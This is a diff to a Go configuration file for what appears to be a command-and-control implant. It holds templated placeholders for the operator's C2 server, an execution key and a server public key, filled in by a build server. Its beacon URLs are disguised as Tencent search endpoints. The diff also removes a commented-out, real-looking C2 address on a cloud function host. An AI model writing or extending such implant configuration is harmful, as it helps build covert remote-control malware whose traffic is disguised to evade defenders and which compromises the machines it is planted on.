@@ -1,15 +1,15 @@
 package config
 
 import (
+	"encoding/base64"
 	"strings"
 	"time"
 )
 
 var (
-	//C2 = "https://gin-tne-fahcesmukw.cn-hangzhou.fcapp.run"
-	//C2 = "http://***.***.***.***:************************************************"
 	host = "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-	C2   = "http://" + strings.ReplaceAll(host, " ", "")
+	// GenServer 将 host 替换为完整 URL（含协议），如 "http://1.2.3.4:8080" 或 "https://1.2.3.4:8443"
+	C2 = strings.ReplaceAll(host, " ", "")
 	//C2                        = "http://127.0.0.1:8080"
 	pass                      = "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 	ExecuteKey                = strings.ReplaceAll(pass, " ", "")
@@ -22,6 +22,10 @@ var (
 
 	Http_get_uri  = "/tencent/mcp/pc/pcsearch"
 	Http_post_uri = "/tencent/sensearch/collection/item/check"
+
+	serverPublicKey         = "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+	ServerPublicKey         = strings.ReplaceAll(serverPublicKey, " ", "")
+	ServerPublicKeyBytes, _ = base64.StdEncoding.DecodeString(ServerPublicKey)
 
 	WaitTime = 5000 * time.Millisecond
 )
